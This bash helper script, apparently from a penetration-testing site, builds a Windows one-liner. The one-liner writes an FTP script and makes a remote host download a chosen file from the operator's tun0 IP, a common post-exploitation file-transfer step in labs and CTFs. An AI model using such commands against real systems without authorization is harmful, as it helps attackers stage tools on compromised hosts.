#!/bin/bash
# Website: https://t3chnocat.com

# Text coloring
yellow='\033[1;33m'
red='\033[1;91m'
nc='\033[0m'

echo
echo -e "${yellow}This gives you a one liner to paste into a Windows host to create and run a ftp script."
echo

# change tun0 to your interface if needed
ip=$(ifconfig tun0 | grep inet | cut -d" " -f10 | head -1)
echo -e "Using IP address of tun0: $ip"
echo

echo -e "What port do you want the ftp server to run on? Hit enter for default of 21${nc}"
read port

if [[ -z "$port" ]];
	then
		ftpport="21"
	else
		ftpport="$port"
fi

echo
echo -e "${yellow}Enter the username: ${nc}"
read user
echo
echo -e "${yellow}Enter the password: ${nc}"
read pass

echo
echo -e "${yellow}What file do you want the remote host to download?${nc}"
read file

echo
echo -e "${yellow}Paste the below to create a ftp script and run it:${nc}"
echo
echo "echo open $ip $ftpport>ftp.txt&&echo $user>>ftp.txt&&echo $pass>>ftp.txt&&echo bin>>ftp.txt&&echo get $file>>ftp.txt&&echo bye>>ftp.txt&&ftp -s:ftp.txt"
echo
